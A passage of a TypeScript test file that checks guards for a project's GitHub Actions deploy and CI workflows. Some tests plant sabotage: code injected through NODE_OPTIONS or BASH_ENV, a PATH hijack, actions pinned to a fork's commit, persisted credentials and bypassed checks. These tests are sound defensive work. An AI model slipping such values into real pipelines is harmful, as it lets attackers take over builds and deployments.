    expect(prodPathFindings(plant(prodGate, `${prodGate}        if: \${{ false }}\n`, job('prod-gate')))).toContain(
      at('DPW-08', 'prod-gate (The prod gate)', PINNED_08),
    )
    expect(
      prodPathFindings(
        plant(
          `        if: \${{ needs.gate.outputs.mode == 'deploy' && needs.gate.outputs.target == 'prod' }}\n`,
          '',
          "      - name: main's own CI\n",
        ),
      ),
    ).toContain(at('DPW-08', "prod-gate (main's own CI)", PINNED_08))
  }, 120_000)
})

describe('Round 5, attack 3: the ways past the allowlist (DPW-04, DPW-08, DPW-10)', () => {
  const at = (rule: string, where: string, text: string) => `${DEPLOY}: ${rule} ${where}: ${text}`
  const credentialed = (planted: ReadonlyMap<string, string>) => credentialedCodeFindings(planted, manifests, lockfile)
  const JOB_IF =
    "runs under the if: JOB_IFS names, whole (the gate under none): no clause GitHub decides it by (the bot test, a gate's verdict, a job's result, the mode or target, services_started) dropped, added or changed"
  const JOB_NEED =
    "needs exactly the jobs JOB_NEEDS names, in order: none dropped, whose result and outputs an if: or env: would read as '', and none added"
  const ACTION_IF = 'runs its action under the if: ACTION_IFS names, whole (none where it names none)'
  // An if:'s clauses joined by && outside parentheses.
  const clauses = (condition: string) => {
    const inner = condition.replace(/^\$\{\{ /, '').replace(/ \}\}$/, '')
    const parts: string[] = []
    let depth = 0
    let start = 0
    for (let i = 0; i < inner.length; i++) {
      if (inner[i] === '(') depth++
      else if (inner[i] === ')') depth--
      else if (depth === 0 && inner.startsWith(' && ', i)) {
        parts.push(inner.slice(start, i))
        start = i + 4
      }
    }
    return [...parts, inner.slice(start)]
  }
  const jobs = workflowJobs(deployText)

  // FLOW-A3-01: a rollback job's if: was held only to the bot test, the drill test and services_started, so
  // one with the gate's verdict gone (an automatic rollback across a floor the gate refused) or with the
  // failure it answers gone (a passing release rolled back, then recorded as running) passed every rule.
  it('holds each rollback job to the gate’s verdict and to the failure it answers (FLOW-A3-01)', () => {
    const verdict = (env: string) =>
      plant(`needs.gate.outputs.rollback_${env} == 'true' && `, '', job(`rollback-${env}`))
    const afterPass = (env: string) =>
      plant(
        ` && (needs.smoke-${env}.result == 'failure' || needs.${env}.result == 'failure')`,
        '',
        job(`rollback-${env}`),
      )
    const allowed = (env: string) =>
      at('DPW-08', `rollback-${env}`, `runs only when the gate allows the automatic rollback (rollback_${env})`)
    const failed = (env: string) => at('DPW-08', `rollback-${env}`, `runs only once smoke-${env} or ${env} failed`)
    for (const env of ['nonprod', 'prod']) {
      expect(prodPathFindings(verdict(env)), env).toEqual([allowed(env)])
      expect(credentialed(verdict(env)), env).toContain(at('DPW-10', `rollback-${env}`, JOB_IF))
      expect(prodPathFindings(afterPass(env)), env).toEqual([failed(env)])
      expect(credentialed(afterPass(env)), env).toContain(at('DPW-10', `rollback-${env}`, JOB_IF))
    }
    const both = edited(
      edited(
        edited(
          edited(deployText, "needs.gate.outputs.rollback_nonprod == 'true' && ", '', job('rollback-nonprod')),
          "needs.gate.outputs.rollback_prod == 'true' && ",
          '',
          job('rollback-prod'),
        ),
        " && (needs.smoke-nonprod.result == 'failure' || needs.nonprod.result == 'failure')",
        '',
        job('rollback-nonprod'),
      ),
      " && (needs.smoke-prod.result == 'failure' || needs.prod.result == 'failure')",
      '',
      job('rollback-prod'),
    )
    expect(prodPathFindings(withText(DEPLOY, both))).toEqual([
      allowed('nonprod'),
      failed('nonprod'),
      allowed('prod'),
      failed('prod'),
    ])
  })

  // The class: a job's if: was the one decision GitHub makes that the guard read only in parts (the bot
  // test, the drill test, the status functions' needs, prod-plan's smoke, services_started), and its needs:
  // and an action step's if: weren't read at all. Each is now pinned whole: every clause of every job's if:
  // dropped in turn, a need dropped from every job, an if: given to the gate, an action step's if: changed,
  // and one given to an action step that has none.
  it('pins every job’s if: and needs: and every action step’s if: whole', () => {
    for (const each of jobs) {
      const condition = jobScalar(each, 'if')
      if (condition === undefined) continue
      const parts = clauses(condition)
      expect(parts.slice(0, 2).join(' && '), each.id).toBe(BOT_TEST)
      for (let i = 2; i < parts.length; i++) {
        const dropped = `\${{ ${parts.filter((_, j) => j !== i).join(' && ')} }}`
        expect(
          credentialed(plant(`    if: ${condition}\n`, `    if: ${dropped}\n`, job(each.id))),
          `${each.id} ${i}`,
        ).toContain(at('DPW-10', each.id, JOB_IF))
      }
    }
    expect(
      credentialed(
        plant(
          '    runs-on: ubuntu-24.04\n',
          `    if: \${{ github.event_name == 'push' }}\n    runs-on: ubuntu-24.04\n`,
          job('gate'),
        ),
      ),
    ).toContain(at('DPW-10', 'gate', JOB_IF))
    for (const each of jobs) {
      const needs = jobNeeds(each)
      if (needs.length === 0) continue
      const line = (each.keys.get('needs') ?? [])[0] ?? ''
      const fewer = needs.length === 1 ? '    needs: []' : `    needs: [${needs.slice(0, -1).join(', ')}]`
      expect(credentialed(plant(`${line}\n`, `${fewer}\n`, job(each.id))), each.id).toContain(
        at('DPW-10', each.id, JOB_NEED),
      )
    }
    expect(
      credentialed(plant('    runs-on: ubuntu-24.04\n', '    needs: []\n    runs-on: ubuntu-24.04\n', job('gate'))),
    ).toContain(at('DPW-10', 'gate', JOB_NEED))
    let held = 0
    for (const each of jobs) {
      for (const step of parsedSteps(each).filter(one => one.uses !== undefined && one.if !== undefined)) {
        const name = step.name ?? ''
        const text = stepText(deployText, each.id, name)
        const changed = edited(text, `        if: ${step.if}\n`, `        if: \${{ true }}\n`)
        expect(
          credentialed(withText(DEPLOY, edited(deployText, text, changed, job(each.id)))),
          `${each.id} ${name}`,
        ).toContain(at('DPW-10', `${each.id} (${name})`, ACTION_IF))
        held++
      }
    }
    expect(held).toBe(11)
    for (const [id, name] of [
      ['build', 'Upload the image'],
      ['gate', "Check out the run's commit"],
    ] as const) {
      const text = stepText(deployText, id, name)
      const given = text.replace(`      - name: ${name}\n`, `      - name: ${name}\n        if: \${{ false }}\n`)
      expect(credentialed(withText(DEPLOY, edited(deployText, text, given, job(id)))), name).toContain(
        at('DPW-10', `${id} (${name})`, ACTION_IF),
      )
    }
  }, 300_000)

  // FETCH-A3-01, in CI: the check that proves the pins ran in check after npm test, on the same runner, so a
  // test could leave a git configuration, a file or a variable behind for it, or write over it. It runs in a
  // job of its own now, before any of the repository's code, and check needs it; each way back is found.
  it('runs the pins check in a job of its own, before any of the repository’s code, which check needs (FETCH-A3-01)', () => {
    const finding = `${CI}: DPW-04 ${PINS_JOB_FINDING}`
    const ci = workflows.get(CI) ?? ''
    const pinsJob = '  action-pins:\n'
    const checkRun = '      - run: node scripts/check-action-pins.ts\n'
    const pinsText = ci.slice(ci.indexOf(pinsJob), ci.indexOf('\n  # ', ci.indexOf(pinsJob)) + 1)
    expect(pinsText.endsWith(checkRun)).toBe(true)
    const inCi = (from: string, to: string, after = pinsJob) => plant(from, to, after, CI)
    const synthCi = '      - run: npm run synth:ci -w @hearth/infra\n'
    for (const [what, planted] of [
      [
        'the check back in check, after npm test',
        withText(
          CI,
          edited(edited(ci, pinsText, ''), synthCi, `${synthCi}${checkRun}`, '\n  check:\n').replace(
            'needs: [secrets, audit, action-pins]',
            'needs: [secrets, audit]',
          ),
        ),
      ],
      ['an install before it', inCi(checkRun, `      - run: npm ci\n${checkRun}`)],
      ['a test before it', inCi(checkRun, `      - run: npx vitest run scripts/guards\n${checkRun}`)],
      [
        'npm’s cache restored',
        inCi('          node-version-file: .nvmrc\n', '          node-version-file: .nvmrc\n          cache: npm\n'),
      ],
      ['credentials kept', inCi('          persist-credentials: false\n', '          persist-credentials: true\n')],
      ['a variable for its step', inCi(checkRun, `${checkRun}        env:\n          GIT_CONFIG_GLOBAL: .gitconfig\n`)],
      ['a runner of its own', inCi('    runs-on: ubuntu-24.04\n', '    runs-on: self-hosted\n')],
      ['a job it waits for', inCi('    runs-on: ubuntu-24.04\n', '    needs: [audit]\n    runs-on: ubuntu-24.04\n')],
      ['another check', inCi(checkRun, '      - run: node scripts/check-action-pins.ts || true\n')],
      ['check not waiting for it', plant('needs: [secrets, audit, action-pins]', 'needs: [secrets, audit]', '', CI)],
      ['check not failing first', plant("contains(needs.*.result, 'failure') || ", '', '\n  check:\n', CI)],
    ] as const) {
      expect(actionPinFindings(planted), what).toContain(finding)
    }
    expect(actionPinFindings(workflows)).toEqual([])
  })
})

// Round 5's fourth attack. The job that proves deploy.yml's pins ran two actions before the check whose refs
// DPW-04 never held (FETCH-A4-01): checkout at a commit pushed only to a fork, which GitHub resolves under
// the action's name, would own the workspace, the check and the git it calls, and could pass a pin moved
// with ACTION_PINS to that fork. And a workflow's own env: or defaults:, which no rule read in ci.yml,
// reaches every step of every job (COMMANDS-A4-01, YAML-A4-01): BASH_ENV runs a file before the check's
// line, NODE_OPTIONS a module before the check, PATH chooses its git, and a default shell or folder changes
// how it runs. So the two actions are held to PINS_JOB_ACTIONS, apart from ACTION_PINS, and ci.yml holds only
// name, on, permissions and jobs at its top.
describe('Round 5, attack 4: the job that proves the pins (DPW-04)', () => {
  const finding = `${CI}: DPW-04 ${PINS_JOB_FINDING}`
  const ci = workflows.get(CI) ?? ''
  const top = 'permissions:\n  contents: read\n'
  const atTop = (lines: string) => withText(CI, edited(ci, top, `${top}${lines}`))
  const inJob = (from: string, to: string) => plant(from, to, '  action-pins:\n', CI)
  const fork = 'ab12cd34ef56ab12cd34ef56ab12cd34ef56ab12'

  it('holds the job’s checkout and setup-node to their commits in PINS_JOB_ACTIONS (FETCH-A4-01)', () => {
    const checkout = `actions/checkout@${PINS_JOB_ACTIONS['actions/checkout']}`
    const setupNode = `actions/setup-node@${PINS_JOB_ACTIONS['actions/setup-node']}`
    expect(ci).toContain(`      - uses: ${checkout}\n`)
    expect(ci).toContain(`      - uses: ${setupNode}\n`)
    for (const [what, planted] of [
      ['checkout at a fork’s commit', inJob(checkout, `actions/checkout@${fork} # v5.0.0`)],
      ['checkout at a fork’s commit under its version', inJob(checkout, checkout.replace(/@[0-9a-f]{40}/, `@${fork}`))],
      ['checkout at a tag', inJob(checkout, 'actions/checkout@v7.0.1')],
      ['checkout at a branch', inJob(checkout, 'actions/checkout@main')],
      ['checkout with another version comment', inJob(checkout, checkout.replace(/# v[\d.]+$/, '# v7.0.2'))],
      ['checkout with no version comment', inJob(checkout, checkout.replace(/ # v[\d.]+$/, ''))],
      ['setup-node at a fork’s commit', inJob(setupNode, setupNode.replace(/@[0-9a-f]{40}/, `@${fork}`))],
      ['setup-node at a tag', inJob(setupNode, 'actions/setup-node@v7.1.0')],
      ['setup-node with its cache', inJob('          package-manager-cache: false\n', '')],
      ['checkout and setup-node swapped', inJob(checkout, setupNode)],
    ] as const) {
      expect(actionPinFindings(planted), what).toContain(finding)
    }
  })

  it('refuses a workflow-level env: or defaults: in ci.yml, which reaches the check’s step (COMMANDS-A4-01, YAML-A4-01)', () => {
    for (const [what, planted] of [
      ['NODE_OPTIONS', atTop('env:\n  NODE_OPTIONS: --import=data:text/javascript,process.exit(0)\n')],
      ['BASH_ENV', atTop('env:\n  BASH_ENV: scripts/ci-prep.sh\n')],
      ['PATH', atTop('env:\n  PATH: /home/runner/work/x/x/bin:/usr/bin:/bin\n')],
      [
        'a default shell',
        atTop('defaults:\n  run:\n    shell: bash --noprofile --norc -e -o pipefail -O expand_aliases {0}\n'),
      ],
      ['a default folder', atTop('defaults:\n  run:\n    working-directory: scripts\n')],
      ['a workflow concurrency', atTop('concurrency: ci\n')],
    ] as const) {
      expect(actionPinFindings(planted), what).toContain(finding)
    }
    // Another spelling of the key is no key workflow.ts reads, which DPW-02 refuses in every workflow.
    for (const key of ['"env"', "'env'", 'env ']) {
      const planted = atTop(`${key}:\n  BASH_ENV: scripts/ci-prep.sh\n`)
      expect(
        [...actionPinFindings(planted), ...permissionFindings(planted)].some(each => each.startsWith(`${CI}: DPW-0`)),
        key,
      ).toBe(true)
    }
  })

  it('holds check’s first step to its if: and exit 1, so nothing lets it pass a job that failed', () => {
    const first = '        run: exit 1\n'
    for (const [what, planted] of [
      ['continue-on-error', plant(first, `${first}        continue-on-error: true\n`, '\n  check:\n', CI)],
      ['a shell of its own', plant(first, `${first}        shell: sh\n`, '\n  check:\n', CI)],
    ] as const) {
      expect(actionPinFindings(planted), what).toContain(finding)
    }
    expect(actionPinFindings(workflows, files)).toEqual([])
  })
})

describe('Round 5 review: every action’s inputs, whole (DPW-10)', () => {
  const WITH =
    'gives its action exactly the inputs STEP_WITHS names, each its value: no checkout names a ref or a path but synth’s three, each its own commit into its own folder, and no download, upload, Node or credentials input is another'
  const at = (where: string) => `${DEPLOY}: DPW-10 ${where}: ${WITH}`
  const found = (texts: ReadonlyMap<string, string>) =>
    credentialedCodeFindings(texts, manifests, lockfile).filter(each => each.endsWith(WITH))
  const checkout = '        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n'
  const release = `          ref: \${{ needs.gate.outputs.commit }}\n`
  const RELEASE = "synth (Check out the release's commit)"

  it('holds every checkout to the run’s commit, and synth’s three to their own commits and folders (GUARDS-01, round 5)', () => {
    // A ref given to a checkout that has none: the gate's (an input, so a dispatch names the commit whose
    // history.ts plans), the build's, a deploy job's and prod-gate's.
    for (const [id, ref] of [
      ['gate', `\${{ inputs.release }}`],
      ['build', 'refs/heads/feature'],
      ['build', '0'.repeat(40)],
      ['nonprod', 'refs/heads/feature'],
      ['prod-gate', 'refs/heads/feature'],
      ['smoke-prod', `\${{ needs.gate.outputs.previous_prod_commit }}`],
    ] as const) {
      expect(found(plant(checkout, `${checkout}          ref: ${ref}\n`, job(id))), `${id} ${ref}`).toEqual([
        at(`${id} (Check out the run's commit)`),
      ])
    }
    // Synth's release checkout without its ref (main's head under the release's label), at a branch, at an
    // input, at a slip GitHub reads as '', and prod's previous checkout at nonprod's previous commit.
    for (const to of [
      '',
      '          ref: refs/heads/feature\n',
      `          ref: \${{ inputs.release }}\n`,
      `          ref: \${{ needs.gate.outputs.comit }}\n`,
    ]) {
      expect(found(plant(release, to, job('synth'))), to).toEqual([at(RELEASE)])
    }
    expect(
      found(
        plant(
          `          ref: \${{ needs.gate.outputs.previous_prod_commit }}\n`,
          `          ref: \${{ needs.gate.outputs.previous_nonprod_commit }}\n`,
          job('synth'),
        ),
      ),
    ).toEqual([at("synth (Check out prod's previous release)")])
    // The release's and nonprod's previous folders swapped: each synth step then runs in the other's tree.
    const swapped = edited(
      edited(deployText, '          path: release\n', '          path: previous-nonprod\n', job('synth')),
      '          path: previous-nonprod\n',
      '          path: release\n',
      "      - name: Check out nonprod's previous release\n",
    )
    expect(found(withText(DEPLOY, swapped))).toEqual([at(RELEASE), at("synth (Check out nonprod's previous release)")])
  })

  it('holds every download, upload, Node and credentials input to its value', () => {
    expect(
      found(
        plant(
          `          path: \${{ runner.temp }}/image\n`,
          `          path: \${{ runner.temp }}/assembly\n`,
          job('nonprod'),
        ),
      ),
    ).toEqual([at('nonprod (Download the image)')])
    expect(
      found(
        plant(
          `          artifact-ids: \${{ needs.synth.outputs.assembly }}\n`,
          `          artifact-ids: \${{ needs.synth.outputs.assembly_previous_prod }}\n`,
          job('prod'),
        ),
      ),
    ).toEqual([at('prod (Download the assembly)')])
    expect(found(plant('          name: assembly\n', '          name: assembly-x\n', job('synth')))).toEqual([
      at("synth (Upload the release's assembly)"),
    ])
    expect(found(plant('          retention-days: 14\n', '          retention-days: 90\n', job('build')))).toEqual([
      at('build (Upload the image)'),
    ])
    expect(
      found(plant('          node-version-file: .nvmrc\n', '          node-version-file: other/.nvmrc\n', job('gate'))),
    ).toEqual([at('gate (Node, from .nvmrc)')])
    expect(
      found(
        plant('          role-duration-seconds: 3600\n', '          role-duration-seconds: 43200\n', job('nonprod')),
      ),
    ).toEqual([at('nonprod (AWS credentials)')])
  })

  it('holds the repository', () => {
    expect(found(workflows)).toEqual([])
  })
})

describe('DPW-14 (C11-D76): the asset and release checks', () => {
  const at = (where: string, rule: string) => `${DEPLOY}: DPW-14 ${where}: ${rule}`
  const CHECKED =
    'runs ASSET_CHECK on each folder it downloaded, with the release it deploys, after its downloads and before the credentials action'

  it('finds each planted breakage in the workflow', () => {
    // GUARDS-02: null == 0 is true on GitHub, so this download would run with empty artifact-ids; round 2's
    // GUARDS-03: so is an operand whose value isn't known compared with a boolean, and 'K' != 'k'.
    const download = `        if: \${{ needs.synth.outputs.assembly != '' }}\n`
    for (const term of ['null == 0', "(github.run_id || 'a') != true", "'\u212A' != 'k'"]) {
      expect(
        assetCheckFindings(plant(download, download.replace(" != '' }}", ` != '' || ${term} }}`), job('nonprod'))),
        term,
      ).toEqual([
        at(
          'nonprod (Download the assembly)',
          'downloads only with an if: that requires its artifact-ids to be non-empty',
        ),
      ])
    }
    expect(assetCheckFindings(movedStep('nonprod', 'Check the assembly', 'What runs'))).toEqual([
      at('nonprod', CHECKED),
    ])
    expect(assetCheckFindings(removedStep('rollback-prod', 'Check the previous assembly'))).toEqual([
      at('rollback-prod', CHECKED),
    ])
    expect(
      assetCheckFindings(plant("asset_refuse 'the assembly holds a symbolic link'", 'true', job('nonprod'))),
    ).toEqual([at('nonprod', CHECKED)])
    expect(
      assetCheckFindings(plant('check_release_in "$RUNNER_TEMP/assembly" "$RELEASE"', 'true', job('prod'))),
    ).toEqual([at('prod', CHECKED)])
    expect(
      assetCheckFindings(plant(`        if: \${{ needs.synth.outputs.assembly != '' }}\n`, '', job('nonprod'))),
    ).toEqual([
      at(
        'nonprod (Download the assembly)',
        'downloads only with an if: that requires its artifact-ids to be non-empty',
      ),
    ])
    expect(
      assetCheckFindings(
        plant(
          `        if: \${{ needs.synth.outputs.assembly != '' }}\n`,
          `        if: \${{ needs.synth.outputs.assembly != '' || always() }}\n`,
          job('nonprod'),
        ),
      ),
    ).toEqual([
      at(
        'nonprod (Download the assembly)',
        'downloads only with an if: that requires its artifact-ids to be non-empty',
      ),
    ])
    expect(
      assetCheckFindings(
        plant(
          `          ${CDK_FOLDER}\n`,
          '          mkdir -p /tmp/cdk && cd /tmp/cdk && HOME="$(mktemp -d)" && export HOME\n',
          job('nonprod'),
        ),
      ),
    ).toEqual([at('nonprod (Deploy Platform, Data and Tasks)', 'starts the CLI in CDK_FOLDER’s fresh folder')])
    expect(assetCheckFindings(removedStep('synth', "Check the release's assembly"))).toEqual([
      at("synth (Upload the release's assembly)", 'runs ASSET_CHECK on each assembly it uploads, before the upload'),
    ])
  })

  it('holds the repository', () => {
    expect(assetCheckFindings(workflows)).toEqual([])
  })
})

// AWS_CHECK itself (DPW-06), run with bash and jq as the deploy jobs run it, after the preamble: aws is a
// shell function answering from planted JSON by its arguments, and git is real, in a scratch
// repository whose main holds A, B and C (the run's commit) and a branch commit X off A.
describe('DPW-06 (C11-D52, C11-D58, C11-D61): AWS_CHECK against planted AWS answers', () => {
  let repo = ''
  let scratch = ''
  const c: Record<'A' | 'B' | 'C' | 'X' | 'L', string> = { A: '', B: '', C: '', X: '', L: '' }
  const email = ['test', 'example.invalid'].join('@')
  const git = (args: readonly string[]) =>
    execFileSync(
      'git',
      [
        ...['-c', 'user.name=hearth-test', '-c', `user.email=${email}`, '-c', 'commit.gpgsign=false'],
        ...['-c', 'tag.gpgSign=false', '-c', 'core.hooksPath=/dev/null', ...args],
      ],
      {
        cwd: repo,
        encoding: 'utf8',
        stdio: ['ignore', 'pipe', 'pipe'],
      },
    ).trim()
  beforeAll(() => {
    repo = mkdtempSync(join(tmpdir(), 'hearth-dpw06-'))
    scratch = mkdtempSync(join(tmpdir(), 'hearth-dpw06-out-'))
    git(['init', '-q', '-b', 'main'])
    for (const name of ['A', 'B', 'C'] as const) {
      writeFileSync(join(repo, 'f'), name)
      git(['add', 'f'])
      git(['commit', '-q', '-m', name])
      c[name] = git(['rev-parse', 'HEAD'])
    }
    git(['checkout', '-q', '-b', 'side', c.A])
    git(['commit', '-q', '--allow-empty', '-m', 'X'])
    c.X = git(['rev-parse', 'HEAD'])
    // L, a later commit than the run's (C), whose run pushed an image after this run's gate read the floors.
    git(['checkout', '-q', '-b', 'later', c.C])
    git(['commit', '-q', '--allow-empty', '-m', 'L'])
    c.L = git(['rev-parse', 'HEAD'])
    git(['checkout', '-q', 'main'])
  })
  afterAll(() => {
    for (const folder of [repo, scratch]) if (folder !== '') rmSync(folder, { recursive: true, force: true })
  })

  const digest = (n: number) => `sha256:${String(n).padStart(64, '0')}`
  const D = { A: digest(1), B: digest(2), C: digest(3), D: digest(4) }
  const release = (commit: 'A' | 'B' | 'C' | 'X' | 'L', d: string) => `${c[commit]}:${d}`
  const stack = (status: string, value: string | null) => JSON.stringify([status, value])
  const ONE = JSON.stringify({ services: ['td-api', 'td-realtime', 'td-worker'], counts: [1, 1, 1] })
  const TWO = JSON.stringify({ services: ['td-api', 'td-api-2', 'td-realtime', 'td-worker'], counts: [2, 1, 1] })
  const MISSING = JSON.stringify({ services: [], counts: [] })
  const tags = (pairs: ReadonlyArray<readonly [string, 'A' | 'B' | 'C' | 'X']>) =>
    JSON.stringify(Object.fromEntries(pairs.map(([d, commit]) => [d, [`sha-${c[commit]}-11-1`]])))

  interface Answers {
    mode: 'deploy' | 'rollback' | 'drill' | 'restore' | 'auto'
    stage?: string
    release: string
    previous?: string
    // auto: what the deploy job's own check found running (REPLACED), the previous release unless named.
    replaced?: string
    first?: boolean
    stack: string
    services: string
    running: string
    drift?: string
    ecr?: string
    // The commits of ECR's images, by their tags (A, B and C unless named), or ECR's raw answer.
    pushed?: ReadonlyArray<'A' | 'B' | 'C' | 'X' | 'L'> | { raw: string }
    restore?: string
  }
  // The stand-in aws: a stack named Hearth-restore-* never exists, so a restore reads prod's alone.
  const STUB = `aws() {
  case "$1 $2" in
    'cloudformation describe-stacks')
      if [ "$STACK" = none ] || [[ "$4" == Hearth-restore-* ]]; then
        echo "An error occurred (ValidationError) when calling the DescribeStacks operation: Stack with id $4 does not exist" >&2
        return 254
      fi
      printf '%s\\n' "$STACK" ;;
    'ecs describe-services')
      if [ "$SERVICES" = nocluster ]; then
        echo 'An error occurred (ClusterNotFoundException) when calling the DescribeServices operation: Cluster not found.' >&2
        return 254
      fi
      printf '%s\\n' "$SERVICES" ;;
    'ecs describe-task-definition')
      if [ "$4" = td-worker ] && [ -n "$DRIFT" ]; then echo "registry.invalid/hearth-server@$DRIFT"; else echo "registry.invalid/hearth-server@$RUNNING"; fi ;;
    'ecr describe-images')
      if [ "$5" = --query ]; then printf '%s\\n' "$PUSHED"; return; fi
      jq -e --arg d "\${6#imageDigest=}" '.[$d]' <<<"$ECR" || { echo 'An error occurred (ImageNotFoundException)' >&2; return 254; } ;;
    *) echo "unexpected aws $*" >&2; return 99 ;;
  esac
}`

  function awsCheck(a: Answers): { verdict: 'pass' | 'refused' | 'rolled-false'; said: string } {
    const output = join(scratch, 'output')
    writeFileSync(output, '')
    const result = spawnSync('bash', ['-c', `${STUB}\n${PREAMBLE}\n${AWS_CHECK}\naws_check "$1"`, '_', a.mode], {
      cwd: repo,
      encoding: 'utf8',
      env: {
        PATH: process.env.PATH ?? '',
        HOME: scratch,
        GITHUB_WORKSPACE: scratch,
        RUNNER_TEMP: scratch,
        GITHUB_SHA: c.C,
        GITHUB_OUTPUT: output,
        GITHUB_STEP_SUMMARY: join(scratch, 'summary'),
        STAGE: a.stage ?? 'nonprod',
        RELEASE: a.release,
        PREVIOUS: a.previous ?? '',
        REPLACED: a.replaced ?? a.previous ?? '',
        FIRST: String(a.first ?? false),
        STACK: a.stack,
        SERVICES: a.services,
        RUNNING: a.running,
        DRIFT: a.drift ?? '',
        ECR: a.ecr ?? '{}',
        PUSHED:
          a.pushed !== undefined && 'raw' in a.pushed
            ? a.pushed.raw
            : JSON.stringify([...(a.pushed ?? ['A', 'B', 'C']).map(commit => `sha-${c[commit]}-12-1`), 'other']),
        ...(a.restore === undefined ? {} : { RESTORE: a.restore }),
      },
    })
    // A refusal is aws_check's one line on stdout (the stand-in's own errors go to stderr).
    const said = result.stdout.trim().split('\n').at(-1) ?? ''
    if (result.status !== 0) return { verdict: 'refused', said }
    return { verdict: readFileSync(output, 'utf8').includes('go=false') ? 'rolled-false' : 'pass', said }
  }
  // Built when a case runs, once beforeAll has made the commits: B's release runs, and ECR holds A, B
  // and C, each under its own commit's tag.
  const runsB = () => ({ stack: stack('UPDATE_COMPLETE', release('B', D.B)), services: ONE, running: D.B })
  const all = () =>
    tags([
      [D.A, 'A'],
      [D.B, 'B'],
      [D.C, 'C'],
    ])

  it('passes each mode with no drift', () => {
    expect(awsCheck({ mode: 'deploy', release: release('C', D.C), ...runsB() }).verdict).toBe('pass')
    expect(awsCheck({ mode: 'rollback', release: release('A', D.A), ...runsB(), ecr: all() }).verdict).toBe('pass')
    expect(awsCheck({ mode: 'drill', release: release('B', D.B), ...runsB(), ecr: all() }).verdict).toBe('pass')
    const live = { stack: stack('UPDATE_COMPLETE', release('C', D.C)), services: ONE, running: D.C }
    expect(
      awsCheck({ mode: 'auto', release: release('C', D.C), previous: release('B', D.B), ...live, ecr: all() }).verdict,
    ).toBe('pass')
    expect(
      awsCheck({
        mode: 'restore',
        stage: 'restore',
        release: release('B', D.B),
        ...runsB(),
        services: 'nocluster',
        ecr: all(),
      }).verdict,
    ).toBe('pass')
  })

  it('refuses a deploy or a drill over drift, naming the rollback, and lets a rollback go only to what all three run', () => {
    const drifted = { ...runsB(), running: D.A }
    const deploy = awsCheck({ mode: 'deploy', release: release('C', D.C), ...drifted, ecr: all() })
    expect(deploy.verdict).toBe('refused')
    // The refusal is shown through the account-id filter, which leaves a commit whole.
    expect(deploy.said).toContain(`dispatch mode=rollback with release ${c.A} first (deploy-and-rollback.md)`)
    // One service drifted: a deploy and a drill are refused alike. No single release is what all three run,
    // so the line's reason is pinned and not the release it names.
    const reason = "aws-check: the services don't run Release's image (an incident rollback outside the pipeline)"
    for (const oneDrifted of [
      awsCheck({ mode: 'deploy', release: release('C', D.C), ...runsB(), drift: D.A, ecr: all() }),
      awsCheck({ mode: 'drill', release: release('B', D.B), ...runsB(), drift: D.A, ecr: all() }),
    ]) {
      expect(oneDrifted.verdict).toBe('refused')
      expect(oneDrifted.said).toContain(reason)
    }
    const drill = awsCheck({ mode: 'drill', release: release('B', D.B), ...drifted, ecr: all() })
    expect(drill.verdict).toBe('refused')
    expect(drill.said).toContain(`dispatch mode=rollback with release ${c.A} first (deploy-and-rollback.md)`)
    expect(awsCheck({ mode: 'rollback', release: release('A', D.A), ...drifted, ecr: all() }).verdict).toBe('pass')
    const elsewhere = { stack: stack('UPDATE_COMPLETE', release('C', D.C)), services: ONE, running: D.B }
    expect(awsCheck({ mode: 'rollback', release: release('A', D.A), ...elsewhere, ecr: all() }).verdict).toBe('refused')
    expect(awsCheck({ mode: 'rollback', release: release('A', D.A), ...runsB(), drift: D.A, ecr: all() }).verdict).toBe(
      'refused',
    )
  }, 30_000)

  it('refuses while a deployment is in progress', () => {
    const two = awsCheck({ mode: 'deploy', release: release('C', D.C), ...runsB(), services: TWO })
    expect(two).toEqual({
      verdict: 'refused',
      said: 'aws-check: a deployment is in progress: wait for it to settle, then dispatch again',
    })
    const moving = awsCheck({
      mode: 'deploy',
      release: release('C', D.C),
      ...runsB(),
      stack: stack('UPDATE_IN_PROGRESS', release('B', D.B)),
    })
    expect(moving).toEqual(two)
    // CloudFormation's longest status, 44 characters, is a deployment in progress too, in every mode.
    const cleanup = stack('UPDATE_ROLLBACK_COMPLETE_CLEANUP_IN_PROGRESS', release('B', D.B))
    expect(awsCheck({ mode: 'deploy', release: release('C', D.C), ...runsB(), stack: cleanup })).toEqual(two)
    expect(
      awsCheck({
        mode: 'auto',
        release: release('C', D.C),
        previous: release('B', D.B),
        ...runsB(),
        stack: cleanup,
        ecr: all(),
      }),
    ).toEqual(two)
  })

  it('finds no release only on a first deploy, with no stack or a failed first create and no services', () => {
    const none = { stack: 'none', services: 'nocluster', running: D.B }
    const failed = { stack: stack('ROLLBACK_COMPLETE', null), services: MISSING, running: D.B }
    expect(awsCheck({ mode: 'deploy', release: release('C', D.C), first: true, ...none }).verdict).toBe('pass')
    expect(awsCheck({ mode: 'deploy', release: release('C', D.C), first: false, ...none }).verdict).toBe('refused')
    expect(awsCheck({ mode: 'deploy', release: release('C', D.C), first: true, ...failed }).verdict).toBe('pass')
    expect(awsCheck({ mode: 'deploy', release: release('C', D.C), first: false, ...failed }).verdict).toBe('refused')
    expect(
      awsCheck({ mode: 'deploy', release: release('C', D.C), first: true, ...failed, services: ONE }).verdict,
    ).toBe('refused')
    expect(awsCheck({ mode: 'rollback', release: release('A', D.A), first: true, ...none, ecr: all() }).verdict).toBe(
      'refused',
    )
    // Round 2's ROLLBACK-03: a failed create whose rollback failed waits for tier 2, Release or none.
    for (const value of [null, release('B', D.B)]) {
      expect(
        awsCheck({
          mode: 'deploy',
          release: release('C', D.C),
          first: true,
          ...failed,
          stack: stack('ROLLBACK_FAILED', value),
        }).said,
        String(value),
      ).toBe(
        'aws-check: the Services stack is ROLLBACK_FAILED (a failed create whose rollback failed), which waits for tier 2 (deploy-and-rollback.md)',
      )
    }
    // Round 3's AWS-01: an update whose rollback failed is no settled stack. The CLI can't continue it, so
    // every mode refuses before anything moves, a restore (which reads prod's Services stack) included.
    const stuck = stack('UPDATE_ROLLBACK_FAILED', release('B', D.B))
    const refusal =
      'aws-check: the Services stack is UPDATE_ROLLBACK_FAILED (an update whose rollback failed), which waits for tier 2 (deploy-and-rollback.md)'
    expect(awsCheck({ mode: 'deploy', release: release('C', D.C), ...runsB(), stack: stuck }).said).toBe(refusal)
    expect(awsCheck({ mode: 'rollback', release: release('A', D.A), ...runsB(), stack: stuck, ecr: all() }).said).toBe(
      refusal,
    )
    expect(awsCheck({ mode: 'drill', release: release('B', D.B), ...runsB(), stack: stuck, ecr: all() }).said).toBe(
      refusal,
